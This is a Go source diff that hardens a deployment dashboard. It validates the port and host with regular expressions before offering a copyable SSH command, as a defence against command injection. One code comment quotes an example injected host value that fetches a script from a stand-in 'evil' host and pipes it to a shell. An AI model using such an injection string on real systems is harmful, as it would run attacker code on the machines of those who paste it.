@@ -152,6 +152,11 @@ func ProductHtmlPopover(d instances.Instance) string {
 // deploymentAction is one button of the DeploymentActions group; Href and Copy are already escaped.
 // A button with a Copy value copies it to the clipboard instead of following a link: used for
 // addresses no application is registered to open (JMX, LDAP, SSH).
+var (
+	sshPortRe = regexp.MustCompile(`^[0-9]{1,5}$`)
+	sshHostRe = regexp.MustCompile(`^[A-Za-z0-9]([A-Za-z0-9.-]{0,251}[A-Za-z0-9])?$`)
+)
+
 type deploymentAction struct {
 	Href, Title, Icon, Copy string
 	Blank                   bool
@@ -180,8 +185,10 @@ func DeploymentActions(d instances.Instance) string {
 	if d.Truthy("DEPLOYMENT_LDAP_LINK") {
 		copyBtn(safe(d.Str("DEPLOYMENT_LDAP_LINK")), "Copy the LDAP URL", "fa-address-book")
 	}
-	if flag("DEPLOYMENT_CRASH_ENABLED") {
-		copyBtn("ssh -p "+safe(d.Str("DEPLOYMENT_CRASH_SSH_PORT"))+" root@"+safe(d.Str("DEPLOYMENT_EXT_HOST")), "Copy the CRaSH SSH command", "fa-terminal")
+	// A command somebody pastes in a terminal: the port and the host are checked, not only HTML-escaped (a host such as
+	// 'x; curl evil|sh' is escaped for the page and still a command line). No button for a value that is not a port or a host name.
+	if flag("DEPLOYMENT_CRASH_ENABLED") && sshPortRe.MatchString(d.Str("DEPLOYMENT_CRASH_SSH_PORT")) && sshHostRe.MatchString(d.Str("DEPLOYMENT_EXT_HOST")) {
+		copyBtn("ssh -p "+d.Str("DEPLOYMENT_CRASH_SSH_PORT")+" root@"+d.Str("DEPLOYMENT_EXT_HOST"), "Copy the CRaSH SSH command", "fa-terminal")
 	}
 	btn(safe(d.Str("DEPLOYMENT_AWSTATS_URL")), "Usage statistics", true, "fa-chart-bar")
 	if flag("DEPLOYMENT_ES_ENABLED") {
